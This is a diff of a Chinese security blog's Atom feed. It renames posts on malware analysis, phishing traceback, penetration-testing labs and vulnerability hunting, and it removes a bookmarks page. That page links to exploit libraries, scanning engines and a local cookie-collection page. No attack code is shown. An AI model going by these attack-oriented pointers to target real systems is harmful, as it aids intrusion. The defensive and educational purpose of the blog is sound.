@@ -4,7 +4,7 @@
   <title>卷卷</title>
   <subtitle>网络安全知识库</subtitle>
   <icon>https://min168.top/assets/favicon.ico</icon>
-  <updated>2026-07-07T01:20:03.744Z</updated>
+  <updated>2026-07-26T07:57:10.104Z</updated>
   <generator>@vuepress/plugin-feed</generator>
   <link rel="self" href="https://min168.top/atom.xml"/>
   <link rel="alternate" href="https://min168.top/"/>
@@ -488,9 +488,9 @@
   </entry>
   <entry>
     <title type="text">H-worm (VBS蠕虫) 感染事件溯源分析报告</title>
-    <id>https://min168.top/response/H-worm%20(VBS%E8%A0%95%E8%99%AB)%20%E6%84%9F%E6%9F%93%E4%BA%8B%E4%BB%B6%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90.html</id>
-    <link href="https://min168.top/response/H-worm%20(VBS%E8%A0%95%E8%99%AB)%20%E6%84%9F%E6%9F%93%E4%BA%8B%E4%BB%B6%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90.html"/>
-    <updated>2026-04-28T15:49:35.000Z</updated>
+    <id>https://min168.top/response/H-worm%20(VBS%E8%A0%95%E8%99%AB)%20%E6%84%9F%E6%9F%93%E4%BA%8B%E4%BB%B6%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html</id>
+    <link href="https://min168.top/response/H-worm%20(VBS%E8%A0%95%E8%99%AB)%20%E6%84%9F%E6%9F%93%E4%BA%8B%E4%BB%B6%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<hr>
 <h1>H-worm (VBS蠕虫) 感染事件溯源分析报告</h1>
 <hr>
@@ -908,10 +908,10 @@
     <published>2026-03-31T14:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">关于xt.exe的分析报告</title>
-    <id>https://min168.top/response/%E5%85%B3%E4%BA%8Ext.exe%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html</id>
-    <link href="https://min168.top/response/%E5%85%B3%E4%BA%8Ext.exe%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html"/>
-    <updated>2026-02-04T15:27:49.000Z</updated>
+    <title type="text">xt.exe恶意样本分析报告</title>
+    <id>https://min168.top/response/xt.exe%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html</id>
+    <link href="https://min168.top/response/xt.exe%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <h3>1. HASH</h3>
 <p><a href="https://s.threatbook.com/report/file/181ba66169e0a6d688f7d73e6598f9c3f8aaedee29e8acd38f80fdea1c9e249f" target="_blank" rel="noopener noreferrer">https://s.threatbook.com/report/file/181ba66169e0a6d688f7d73e659...</a></p>
@@ -1023,10 +1023,10 @@
     <published>2026-02-04T15:27:49.000Z</published>
   </entry>
   <entry>
-    <title type="text">仿真钓鱼页面窃取用户凭证</title>
-    <id>https://min168.top/response/%E9%AB%98%E4%BB%BF%E7%9C%9F%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81.html</id>
-    <link href="https://min168.top/response/%E9%AB%98%E4%BB%BF%E7%9C%9F%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81.html"/>
-    <updated>2026-01-04T15:17:36.000Z</updated>
+    <title type="text">高仿真钓鱼页面渗透测试与溯源分析</title>
+    <id>https://min168.top/response/%E9%AB%98%E4%BB%BF%E7%9C%9F%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90.html</id>
+    <link href="https://min168.top/response/%E9%AB%98%E4%BB%BF%E7%9C%9F%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<p>钓鱼最简单的方法就是网页复制下来修改后发给受害者窃取账密。<br>
 可惜出师未捷身先死~~~<br>
 告警报检测到恶意文件，根据告警信息找到了用户。<br>
@@ -5844,10 +5844,10 @@ WDAC默认限制未签名/非微软认证的代码执行。但银狐利用如下
     <published>2025-11-24T16:09:39.000Z</published>
   </entry>
   <entry>
-    <title type="text">ATT &amp;CK 框架实践阅读笔记</title>
-    <id>https://min168.top/response/ATT%20_CK%20%E6%A1%86%E6%9E%B6%E5%AE%9E%E8%B7%B5%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0.html</id>
-    <link href="https://min168.top/response/ATT%20_CK%20%E6%A1%86%E6%9E%B6%E5%AE%9E%E8%B7%B5%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0.html"/>
-    <updated>2026-01-02T16:31:31.000Z</updated>
+    <title type="text">ATT&amp;CK攻防框架实战阅读笔记</title>
+    <id>https://min168.top/response/ATT_CK%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%9E%E6%88%98%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0.html</id>
+    <link href="https://min168.top/response/ATT_CK%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%9E%E6%88%98%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<h2>什么是MITRE ATT&amp;CK</h2>
 <p>是一个对抗行为知识库。</p>
 <figure><figcaption>MITRE ATT&amp;CK</figcaption></figure>
@@ -6352,10 +6352,10 @@ SIEM是一种整体性的安全方法。它将​安全信息管理（SIM） ​
     <published>2025-08-10T14:49:59.000Z</published>
   </entry>
   <entry>
-    <title type="text">应急响应术语</title>
-    <id>https://min168.top/response/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%9C%AF%E8%AF%AD.html</id>
-    <link href="https://min168.top/response/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%9C%AF%E8%AF%AD.html"/>
-    <updated>2025-08-10T14:36:11.000Z</updated>
+    <title type="text">应急响应核心术语与流程解析</title>
+    <id>https://min168.top/response/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A0%B8%E5%BF%83%E6%9C%AF%E8%AF%AD%E4%B8%8E%E6%B5%81%E7%A8%8B%E8%A7%A3%E6%9E%90.html</id>
+    <link href="https://min168.top/response/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A0%B8%E5%BF%83%E6%9C%AF%E8%AF%AD%E4%B8%8E%E6%B5%81%E7%A8%8B%E8%A7%A3%E6%9E%90.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[
 <p>攻击指标 (IoA) 是攻击者可能企图破坏系统的预警信号。它将各种数据片段（包括未知属性、IoC 和上下文信息，例如组织风险和情报）构建成潜在威胁的动态实时态势图。IoA 并非为了识别特定的恶意工具，而是通过关注所有攻击者为破坏系统而必须采取的步骤（例如侦察、初始访问、执行）来识别攻击者的战略意图。IoA 对于检测新的、复杂的网络攻击形式（例如无恶意软件入侵和零日攻击）至关重要。</p>
 <h1>IoC</h1>
@@ -6702,10 +6702,10 @@ SIEM是一种整体性的安全方法。它将​安全信息管理（SIM） ​
     <published>2025-07-06T14:02:58.000Z</published>
   </entry>
   <entry>
-    <title type="text">velociraptor(迅猛龙)快速上手</title>
-    <id>https://min168.top/response/velociraptor(%E8%BF%85%E7%8C%9B%E9%BE%99)%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B.html</id>
-    <link href="https://min168.top/response/velociraptor(%E8%BF%85%E7%8C%9B%E9%BE%99)%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B.html"/>
-    <updated>2025-12-05T16:22:10.000Z</updated>
+    <title type="text">Velociraptor(迅猛龙)快速上手指南</title>
+    <id>https://min168.top/response/Velociraptor(%E8%BF%85%E7%8C%9B%E9%BE%99)%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97.html</id>
+    <link href="https://min168.top/response/Velociraptor(%E8%BF%85%E7%8C%9B%E9%BE%99)%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<h2>基本概念</h2>
 <h3>数字取证和事件响应 (DFIR)</h3>
 <p>Digital Forensics and Incident Response (DFIR)</p>
@@ -6869,10 +6869,10 @@ SIEM是一种整体性的安全方法。它将​安全信息管理（SIM） ​
     <published>2025-03-27T13:55:04.000Z</published>
   </entry>
   <entry>
-    <title type="text">DC-8靶机</title>
-    <id>https://min168.top/perm/DC-8%E9%9D%B6%E6%9C%BA.html</id>
-    <link href="https://min168.top/perm/DC-8%E9%9D%B6%E6%9C%BA.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">DC-8靶机渗透测试实战</title>
+    <id>https://min168.top/perm/DC-8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98.html</id>
+    <link href="https://min168.top/perm/DC-8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<ol>
 <li>
 <p>主机扫描使用arp-scan扫描工具  --localnet 扫描本地网络</p>
@@ -7165,10 +7165,10 @@ SIEM是一种整体性的安全方法。它将​安全信息管理（SIM） ​
     <published>2025-03-27T13:55:04.000Z</published>
   </entry>
   <entry>
-    <title type="text">Metasploitable3下载与安装</title>
-    <id>https://min168.top/perm/Metasploitable3%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85.html</id>
-    <link href="https://min168.top/perm/Metasploitable3%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85.html"/>
-    <updated>2025-11-26T15:59:54.000Z</updated>
+    <title type="text">Metasploitable3靶机下载与安装教程</title>
+    <id>https://min168.top/perm/Metasploitable3%E9%9D%B6%E6%9C%BA%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B.html</id>
+    <link href="https://min168.top/perm/Metasploitable3%E9%9D%B6%E6%9C%BA%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<p>一、<a href="https://so.csdn.net/so/search?q=Vagrant&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">Vagrant</a>下载与安装</p>
 <p><strong>Vagrant</strong>是一个基于<a href="https://so.csdn.net/so/search?q=Ruby&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">Ruby</a>的工具，​<strong>用于创建和部署虚拟化开发环境</strong>​。它使用Oracle的开源VirtualBox<a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E5%8C%96&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">虚拟化</a>系统，使用Chef创建自动化虚拟环境。</p>]]></summary>
     <content type="html"><![CDATA[<p>一、<a href="https://so.csdn.net/so/search?q=Vagrant&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">Vagrant</a>下载与安装</p>
@@ -9020,10 +9020,10 @@ Finished：客户端和服务器各自计算并发送一个Finished数据包，�
     <published>2025-03-04T09:59:55.000Z</published>
   </entry>
   <entry>
-    <title type="text">漏洞挖掘思路</title>
-    <id>https://min168.top/perm/%E6%8C%96%E6%B4%9E%E6%80%9D%E8%B7%AF.html</id>
-    <link href="https://min168.top/perm/%E6%8C%96%E6%B4%9E%E6%80%9D%E8%B7%AF.html"/>
-    <updated>2025-03-02T05:52:48.000Z</updated>
+    <title type="text">渗透测试漏洞挖掘思路与实战方法论</title>
+    <id>https://min168.top/perm/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%96%B9%E6%B3%95%E8%AE%BA.html</id>
+    <link href="https://min168.top/perm/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%96%B9%E6%B3%95%E8%AE%BA.html"/>
+    <updated>2026-07-26T07:49:45.000Z</updated>
     <summary type="html"><![CDATA[<h4>漏洞挖掘思路</h4>
 <p>大厂SRC严重漏洞的特点</p>
 <h5>1.和数据相关</h5>
@@ -10374,49 +10374,6 @@ a 代表 "所有用户"（所有者、组和其他）。<br>
     <published>2023-09-18T00:00:00.000Z</published>
   </entry>
   <entry>
-    <title type="text">收藏夹</title>
-    <id>https://min168.top/nav.html</id>
-    <link href="https://min168.top/nav.html"/>
-    <updated>2025-01-21T16:41:57.000Z</updated>
-    <summary type="html"><![CDATA[<h3>视频</h3>
-<p><a href="https://www.bilibili.com/" target="_blank" rel="noopener noreferrer">哔哩哔哩 (゜-゜)<br>        つロ 干杯~-bilibili</a><br>        ​<a href="https://www.douyin.com/" target="_blank" rel="noopener noreferrer">抖音-记录美好生活</a><br>        ​<a href="https://www.zhihuishu.com/" target="_blank" rel="noopener noreferrer">智慧树</a><br></p>]]></summary>
-    <content type="html"><![CDATA[<h3>视频</h3>
-<p><a href="https://www.bilibili.com/" target="_blank" rel="noopener noreferrer">哔哩哔哩 (゜-゜)<br>        つロ 干杯~-bilibili</a><br>        ​<a href="https://www.douyin.com/" target="_blank" rel="noopener noreferrer">抖音-记录美好生活</a><br>        ​<a href="https://www.zhihuishu.com/" target="_blank" rel="noopener noreferrer">智慧树</a><br></p>
-<h3>编程</h3>
-<h3>Web前端</h3>
-<p><a href="https://vant-contrib.gitee.io/vant-weapp/?from=thosefree.com#/home" target="_blank" rel="noopener noreferrer">介绍 - Vant Weapp</a><br>        ​<a href="https://v5.bootcss.com/" target="_blank" rel="noopener noreferrer">Bootstrap v5 中文文档 · Bootstrap 是全球最受欢迎的 HTML、CSS 和 JS 前端工具库。 | Bootstrap 中文网</a><br>        ​<a href="https://weapp.iviewui.com/docs/guide/start" target="_blank" rel="noopener noreferrer">快速上手 - iView Weapp</a><br>        ​<a href="https://ng.ant.design/components/overview/zh" target="_blank" rel="noopener noreferrer">组件(Components)<br>         | NG-ZORRO</a><br>        ​<a href="https://element.eleme.cn/#/zh-CN" target="_blank" rel="noopener noreferrer">Element - 网站快速成型工具</a><br>        ​<a href="https://www.iconfont.cn/" target="_blank" rel="noopener noreferrer">iconfon-阿里巴巴矢量图标库</a><br></p>
-<h3>python</h3>
-<p><a href="https://maicss.com/pyqt/v6/firstProgram" target="_blank" rel="noopener noreferrer">PyQt6 的第一个程序 | Maicss</a><br>        ​<a href="https://python123.io/" target="_blank" rel="noopener noreferrer">Python123 - 编程更简单</a><br>        ​<a href="https://www.python.org/downloads/windows/" target="_blank" rel="noopener noreferrer">Python Releases for Windows | Python.org</a><br>        ​<a href="https://pranx.com/" target="_blank" rel="noopener noreferrer">Online Pranks 😈😂 | Just Pranx, Bro!</a><br>        ​<a href="https://vscodethemes.com/" target="_blank" rel="noopener noreferrer">VSCodeThemes — Preview Visual Studio Code Themes.</a><br>        ​<a href="https://www.runoob.com/" target="_blank" rel="noopener noreferrer">菜鸟</a><br>        ​<a href="https://leetcode.cn/" target="_blank" rel="noopener noreferrer">力扣（LeetCode）官网 - 全球极客挚爱的技术成长平台</a><br>        ​<a href="http://www.codexy.cn/" target="_blank" rel="noopener noreferrer">代码学院</a><br>        ​<a href="https://www.nowcoder.com/" target="_blank" rel="noopener noreferrer">牛客网</a><br>        ​<a href="https://www.chinaooc.com.cn/course/65c0140cbb5c5a8025c0a183" target="_blank" rel="noopener noreferrer">课程 - 国家高等教育智慧教育平台</a><br>        ​<a href="https://poetize.cn/article/98" target="_blank" rel="noopener noreferrer">POETIZE - 最美博客</a><br></p>
-<h3>控制</h3>
-<p><a href="https://gitee.com/" target="_blank" rel="noopener noreferrer">Gitee-我的工作台</a><br>        ​<a href="https://home.console.aliyun.com/home/dashboard/ProductAndService" target="_blank" rel="noopener noreferrer">阿里云控制台首页</a><br>        ​<a href="https://mp.csdn.net/mp_blog/creation/editor?not_checkout=1&amp;spm=1015.2103.3001.8012" target="_blank" rel="noopener noreferrer">写文章-CSDN创作中心</a><br>        ​<a href="https://www.nisphome.cn/" target="_blank" rel="noopener noreferrer">首页 - 【官网】国家信息安全水平考试NISP—NISP全国运营中心</a><br>        ​<a href="https://xn--4gq62f52gdss.ink/#/dashboard" target="_blank" rel="noopener noreferrer">一元机场</a><br>        ​<a href="https://jf16.net/user/shop" target="_blank" rel="noopener noreferrer">商店 — JFCLOUND</a><br>        ​<a href="https://www.sanfengyun.com/login/" target="_blank" rel="noopener noreferrer">登录控制台_三丰云</a><br>        ​<a href="https://developer.microsoft.com/zh-cn/microsoft-365/profile" target="_blank" rel="noopener noreferrer">仪表板 - Microsoft 365 开发人员中心</a><br>        ​<a href="https://cas.cxtc.edu.cn/lyuapServer/login?service=http://portal.cxtc.edu.cn/shiro-cas" target="_blank" rel="noopener noreferrer">身份认证管理平台</a><br>        ​<a href="https://passport.oray.com/login/hsk?s_url=https%3A%2F%2Fconsole.hsk.oray.com%2Fforward" target="_blank" rel="noopener noreferrer">花生壳</a><br>        ​<a href="https://mail.163.com/" target="_blank" rel="noopener noreferrer">163网易免费邮-你的专业电子邮局</a><br>        ​<a href="https://dash.cloudflare.com/login" target="_blank" rel="noopener noreferrer">Cloudflare | Web Performance &amp; Security</a><br>        ​<a href="https://activity.huaweicloud.com/discount_area_v5/index.html" target="_blank" rel="noopener noreferrer">新春钜惠专场-华为云</a><br></p>
-<h3>工具</h3>
-<p><a href="https://fanyi.sogou.com/text?keyword=&amp;transfrom=auto&amp;transto=zh-CHS&amp;model=general" target="_blank" rel="noopener noreferrer">搜狗翻译</a><br>        ​<a href="https://cn.anotepad.com/" target="_blank" rel="noopener noreferrer">在线记事本 - 在线撰写和共享笔记</a><br>        ​<a href="https://ip.900cha.com/" target="_blank" rel="noopener noreferrer">IP地址查询_本机IP_我的IP</a><br>        ​<a href="https://haowallpaper.com/homeView" target="_blank" rel="noopener noreferrer">免费4K高清壁纸-电脑背景图片-Mac壁纸网站「哲风壁纸」</a><br>        ​<a href="https://www.imsdn.cn/" target="_blank" rel="noopener noreferrer">MSDN原版系统,纯净镜像,MSDN ISO下载 - 我的MSDN</a><br>        ​<a href="https://lsdy.top/" target="_blank" rel="noopener noreferrer">断水流崖</a><br>        ​<a href="https://greasyfork.org/zh-CN" target="_blank" rel="noopener noreferrer">油猴</a><br>        ​<a href="https://crxdl.com/" target="_blank" rel="noopener noreferrer">CrxDL - 下载谷歌浏览器(Chrome)<br>        扩展插件CRX</a><br>        ​<a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener noreferrer">MSDN, 我告诉你 - 做一个安静的工具站</a><br>        ​<a href="https://www.weidown.com/" target="_blank" rel="noopener noreferrer">微当下载</a><br>        ​<a href="https://chrome.pictureknow.com/?id=56f2518de196429482c29e321e6001e2" target="_blank" rel="noopener noreferrer">收藏猫插件-Chrome插件商店,谷歌浏览器插件,谷歌应用商店插件推荐及下载</a><br>        ​<a href="http://www.den4b.com/products/renamer" target="_blank" rel="noopener noreferrer">ReNamer « Products « den4b.com</a><br>        ​<a href="http://www.downcc.com/" target="_blank" rel="noopener noreferrer">绿色资源网-绿色下载站-做最好的免费软件下载网站</a><br>        ​<a href="https://www.hackthissite.org/user/login" target="_blank" rel="noopener noreferrer">Hack This Site :: Login</a><br>        ​<a href="https://www.zfile.vip/" target="_blank" rel="noopener noreferrer">ZFile 官网</a><br>        ​<a href="https://cloud.projectdiscovery.io/" target="_blank" rel="noopener noreferrer">ProjectDiscovery Cloud 平台</a><br>        ​<a href="https://curlconverter.com/" target="_blank" rel="noopener noreferrer">Convert curl commands to code</a><br></p>
-<h3>文章</h3>
-<p><a href="https://wx.zsxq.com/login" target="_blank" rel="noopener noreferrer">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具</a><br>        ​<a href="https://wiki.wy876.cn/#/" target="_blank" rel="noopener noreferrer">wy876漏洞文库</a><br>        ​<a href="https://blog.aabyss.cn/" target="_blank" rel="noopener noreferrer">渊龙Sec安全团队博客-为国之安全而奋斗，为信息安全而发声！</a><br>        ​<a href="http://wooyun.2xss.cc/" target="_blank" rel="noopener noreferrer">乌云网镜像丨乌云知识库丨Wooyun镜像丨乌云漏洞平台</a><br>        ​<a href="https://www.cnblogs.com/bonelee/p/15194031.html" target="_blank" rel="noopener noreferrer">Gopher协议原理和限制介绍——Gopher协议支持发出GET、POST请求（类似协议转换）：可以先截获get请求包和post请求包，在构成符合gopher协议的请求 - bonelee - 博客园</a><br>        ​<a href="https://www.hackingarticles.in/" target="_blank" rel="noopener noreferrer">黑客攻击文章 - Raj Chandel 的博客</a><br>        ​<a href="https://wechat.doonsec.com/" target="_blank" rel="noopener noreferrer">安全圈微信搜索_订阅号及文章全面收录,一搜即达-AI赋能，深度分析</a><br>        ​<a href="https://kerrynotes.com/register-american-apple-id/" target="_blank" rel="noopener noreferrer">【2024年】注册美国区Apple ID保姆级教程 - Kerry的学习笔记</a><br>        ​<a href="https://paper.seebug.org/" target="_blank" rel="noopener noreferrer">Paper</a><br></p>
-<h3>教程</h3>
-<p><a href="https://www.yuque.com/xiaokp7/ocvun2" target="_blank" rel="noopener noreferrer">安云文库 hfy1</a><br>        ​<a href="https://www.edu-learn4fun.com/" target="_blank" rel="noopener noreferrer">易启学 - 智能化教育领导者</a><br>        ​<a href="http://192.168.100.221:8080/" target="_blank" rel="noopener noreferrer">网安授课视频</a><br>        ​<a href="https://wiki.wgpsec.org/knowledge/" target="_blank" rel="noopener noreferrer">狼组安全团队公开知识库</a><br>        ​<a href="https://www.kali.org/docs/" target="_blank" rel="noopener noreferrer">Kali 文档 |Kali Linux 文档</a><br>        ​<a href="https://websec.readthedocs.io/zh/latest/" target="_blank" rel="noopener noreferrer">Web安全学习笔记 — Web安全学习笔记 1.0 文档</a><br>        ​<a href="https://bypass007.github.io/Emergency-Response-Notes/" target="_blank" rel="noopener noreferrer">前言 · 应急响应实战笔记</a><br>        ​<a href="https://taogefx.com/" target="_blank" rel="noopener noreferrer">涛哥资源分享网_收集整理网络资源，抛光打蜡免费分享！</a><br>        ​<a href="https://wizardforcel.gitbooks.io/metasploit-manual/content/1.html" target="_blank" rel="noopener noreferrer">目录 | Metasploit 中文手册</a><br>        ​<a href="https://www.yuque.com/haoguoguo7/qmudii/sphtvu3i3b5tqoen?singleDoc=" target="_blank" rel="noopener noreferrer">安云安全更新解压密码 ud8l</a><br>        ​<a href="https://pan.baidu.com/s/1qdJ-QemSNNwicctAv8EDqQ?pwd=8ect#list/vmode=grid&amp;path=%2F&amp;parentPath=%2Fsharelink4066810566-718689861766212" target="_blank" rel="noopener noreferrer">安全牛至尊会员课程_免费高速下载|百度网盘-分享无限制</a><br>        ​<a href="https://www.yuque.com/xiaokp7/ocvun2/rlbhh7h3l4xwg317" target="_blank" rel="noopener noreferrer">万户协同办公平台 axis组件存在远程命令执行漏洞</a><br>        ​<a href="http://127.0.0.1:8787/user/cookie-id" target="_blank" rel="noopener noreferrer">ALL USERS Here!</a><br>        ​<a href="https://yaklang.com/products/intro" target="_blank" rel="noopener noreferrer">Yakit: 集成化单兵安全能力平台 | Yak Program Language</a><br>        ​<a href="https://wiki.bafangwy.com/project-4/" target="_blank" rel="noopener noreferrer">课程问题 - 八方网域</a><br>        ​<a href="https://qsecure.com.cy/resources/educational-corner/top-ten-pentest-resources" target="_blank" rel="noopener noreferrer">QSecure - 十大渗透测试资源</a><br></p>
-<h3>信收</h3>
-<p><a href="http://148.135.76.144/fofa.php" target="_blank" rel="noopener noreferrer">安云 FOFA</a><br>        ​<a href="https://hunter.qianxin.com/" target="_blank" rel="noopener noreferrer">鹰图平台</a><br>        ​<a href="https://www.google.com.hk/advanced_search?hl=zh-CN" target="_blank" rel="noopener noreferrer">Google 高级搜索</a><br>        ​<a href="https://fofa.info/" target="_blank" rel="noopener noreferrer">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a><br>        ​<a href="https://www.zoomeye.org/" target="_blank" rel="noopener noreferrer">首页 - 网络空间测绘,网络安全,漏洞分析,动态测绘,钟馗之眼,时空测绘,赛博测绘 - ZoomEye("钟馗之眼")<br>        网络空间搜索引擎</a><br>        ​<a href="http://finger.tidesec.com/" target="_blank" rel="noopener noreferrer">TideFinger 潮汐指纹 TideFinger 潮汐指纹</a><br>        ​<a href="https://quake.360.net/quake/#/index" target="_blank" rel="noopener noreferrer">360网络空间测绘 — 因为看见，所以安全</a><br>        ​<a href="https://ti.nsfocus.com/" target="_blank" rel="noopener noreferrer">NTI - 威胁情报中心 · 首页</a><br>        ​<a href="https://0.zone/" target="_blank" rel="noopener noreferrer">零零信安 | ASM | 攻击面 | 外部攻击面管理专家 | 比攻击者更快一步了解您自己的风险</a><br>        ​<a href="https://x.threatbook.com/v5/mapping" target="_blank" rel="noopener noreferrer">资产测绘 - X情报社区</a><br>        ​<a href="https://ti.360.net/" target="_blank" rel="noopener noreferrer">360安全大脑</a><br>        ​<a href="https://www.linuxcool.com/" target="_blank" rel="noopener noreferrer">Linux命令大全(手册)<br>         – 真正好用的Linux命令在线查询网站</a><br>        ​<a href="https://site.ip138.com/" target="_blank" rel="noopener noreferrer">域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询</a><br>        ​<a href="https://tool.lu/ip/" target="_blank" rel="noopener noreferrer">IP地址查询 - 在线工具</a><br>        ​<a href="https://whatsmydns.me/zh#A/mall.bfxsaccque.com" target="_blank" rel="noopener noreferrer">检查全球 DNS 传播 – WhatsMyDNS</a><br>        ​<a href="https://x.threatbook.com/" target="_blank" rel="noopener noreferrer">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a><br>        ​<a href="https://securitytrails.com/" target="_blank" rel="noopener noreferrer">SecurityTrails: Data Security, Threat Hunting, and Attack Surface Management Solutions for Security Teams</a><br>        ​<a href="https://www.ip2location.com/free/visitor-blocker" target="_blank" rel="noopener noreferrer">按国家/地区阻止访客 |IP2位置</a><br>        ​<a href="http://www.jsons.cn/nslookup/" target="_blank" rel="noopener noreferrer">在线域名解析记录检测-在线Nslookup域名解析查询工具</a><br>        ​<a href="https://search.censys.io/" target="_blank" rel="noopener noreferrer">Censys Search</a><br></p>
-<h3>海外</h3>
-<p><a href="https://www.youtube.com/" target="_blank" rel="noopener noreferrer">YouTube</a><br>        ​<a href="https://en.wikipedia.org/wiki/Main_Page" target="_blank" rel="noopener noreferrer">维基百科，自由的百科全书</a><br>        ​<a href="https://wiki.bafangwy.com/doc/29/" target="_blank" rel="noopener noreferrer">【汇总】蚁剑antsword连接报错 - 课程问题 - 八方网域</a><br>        ​<a href="https://www.google.com.hk/index.html" target="_blank" rel="noopener noreferrer">Google</a><br></p>
-<h3>FTP</h3>
-<p><a href="https://www.python.org/ftp/python/" target="_blank" rel="noopener noreferrer">pyenv/python</a><br>        ​<a href="https://repo.huaweicloud.com/java/jdk/" target="_blank" rel="noopener noreferrer">华为JDK源</a><br>        ​<a href="https://packages.vmware.com/tools/esx/" target="_blank" rel="noopener noreferrer">wmwere_tools</a><br>        ​<a href="https://mirrors.yun-idc.com/centos/" target="_blank" rel="noopener noreferrer">阿里云centos源centos/</a><br></p>
-<h3>AI</h3>
-<p><a href="https://yiyan.baidu.com/" target="_blank" rel="noopener noreferrer">文心一言</a><br>        ​<a href="https://chatgpt.com/" target="_blank" rel="noopener noreferrer">ChatGPT</a><br>        ​<a href="https://kimi.moonshot.cn/" target="_blank" rel="noopener noreferrer">Kimi.ai - 帮你看更大的世界</a><br>        ​<a href="https://tongyi.aliyun.com/qianwen/" target="_blank" rel="noopener noreferrer">通义千问</a><br>        ​<a href="https://xinghuo.xfyun.cn/" target="_blank" rel="noopener noreferrer">讯飞星火认知大模型-AI大语言模型-星火大模型-科大讯飞</a><br>        ​<a href="https://chatglm.cn/main/alltoolsdetail" target="_blank" rel="noopener noreferrer">智谱清言</a><br>        ​<a href="https://metaso.cn/?s=bdpc" target="_blank" rel="noopener noreferrer">秘塔AI搜索</a><br>        ​<a href="https://www.dongaigc.com/" target="_blank" rel="noopener noreferrer">懂AI | 一站式AI导航</a><br>        ​<a href="https://huggingface.co/docs/datasets/index" target="_blank" rel="noopener noreferrer">Datasets</a><br>        ​<a href="https://www.cursor.com/" target="_blank" rel="noopener noreferrer">Cursor</a><br>        ​<a href="https://code.fittentech.com/?ref=tg" target="_blank" rel="noopener noreferrer">免费好用的AI编程助手 Fitten Code - 